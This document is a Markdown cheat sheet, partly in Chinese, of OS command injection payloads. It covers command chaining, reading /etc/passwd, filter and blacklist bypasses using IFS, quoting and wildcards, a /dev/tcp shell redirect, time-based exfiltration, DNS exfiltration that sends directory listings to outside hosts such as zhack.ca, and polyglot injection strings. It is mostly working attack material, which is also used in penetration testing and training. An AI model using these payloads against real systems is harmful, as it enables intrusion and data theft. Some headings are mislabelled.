# 命令注入

> 命令注入是安全漏洞中的一种，它使攻击者可以在有漏洞的应用程序中执行任意命令。

## Summary

* [Tools](#tools)
* [Exploits](#exploits)
  * [Basic commands](#basic-commands)
  * [Chaining commands](#chaining-commands)
  * [Inside a command](#inside-a-command)
* [过滤绕过](#过滤绕过)
  * [不带空格](不带空格)
  * [使用换行符](#使用换行符)
  * [Bypass blacklisted words](#bypass-blacklisted-words)
   * [使用单引号](#使用单引号)
   * [使用双引号](#使用双引号)
   * [使用斜杠和反斜杠](#使用斜杠和反斜杠)
   * [使用 $@](#使用 $@)
   * [使用变量表达式](#使用变量表达式)
   * [使用通配符](#使用通配符)
* [Challenge](#challenge)
* [Time based data exfiltration](#time-based-data-exfiltration)
* [DNS based data exfiltration](#dns-based-data-exfiltration)
* [Polyglot command injection](#polyglot-command-injection)
* [References](#references)
    

## Tools

* [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)

## Exploits

### Basic commands

Execute the command and voila :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```

### Chaining commands

```powershell
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls    Only if the first cmd fail
```

### Inside a command

```bash
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```

## 过滤绕过

### 不带空格

Works on Linux only.

```powershell
swissky@crashlab:~/Www$ cat</etc/passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
RCE
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
Linux crashlab 4.4.X-XX-generic #72-Ubuntu

swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
```

不带空格，$或{}的命令执行-Linux（仅限Bash）

```powershell
IFS=,;`cat<<<uname,-a`
```

Works on Windows only.

```powershell
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

### 使用换行符

```powershell
something%0Acat%20/etc/passwd
```

### Bypass Blacklisted words

#### 使用单引号

```powershell
w'h'o'am'i
```

#### 使用单引号

```powershell
w"h"o"am"i
```

#### 使用斜杠和反斜杠

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

#### 使用 $@

```powershell
who$@ami

echo $0
-> /usr/bin/zsh
echo whoami|$0
```

#### 使用比变量表达式

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### 使用通配符

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## Challenge

Challenge based on the previous tricks, what does the following command do:

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

## Time based data exfiltration

Extracting data : char by char

```powershell
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```

## DNS based data exfiltration

Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca

```powershell
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```powershell
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

Online tools to check for DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

## Polyglot command injection

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

e.g:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

```bash
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

e.g:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```

## References

* [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
* [Bug Bounty Survey - Windows RCE spaceless](https://twitter.com/bugbsurveys/status/860102244171227136)
* [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
* [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
